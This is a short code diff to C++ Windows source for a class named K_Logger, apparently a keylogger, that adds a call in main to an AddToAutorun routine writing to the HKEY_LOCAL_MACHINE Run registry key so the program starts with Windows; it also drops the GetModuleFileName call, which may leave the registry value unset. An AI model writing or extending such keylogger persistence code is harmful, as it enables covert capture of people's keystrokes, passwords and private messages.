@@ -811,16 +811,16 @@ void K_Logger::VisibilityApp()
 void K_Logger::AddToAutorun()
 {
 	HKEY registryKey;
-	char sizeReg[0x100];
+	char sizeReg[1024];
 
-	GetModuleFileName(NULL, sizeReg, sizeof(sizeReg));
 	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
-		"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
 		NULL,
-		nullptr, 
-		REG_OPTION_NON_VOLATILE, 
-		KEY_SET_VALUE, nullptr, 
+		nullptr,
+		REG_OPTION_NON_VOLATILE,
+		KEY_SET_VALUE, nullptr,
 		&registryKey, nullptr);
+
 
 	if (registryKey)
 	{
@@ -836,6 +836,8 @@ int main()
 	char key;
 
 	K_Logger kl;
+
+	kl.AddToAutorun();
 
 	while (true)
 	{
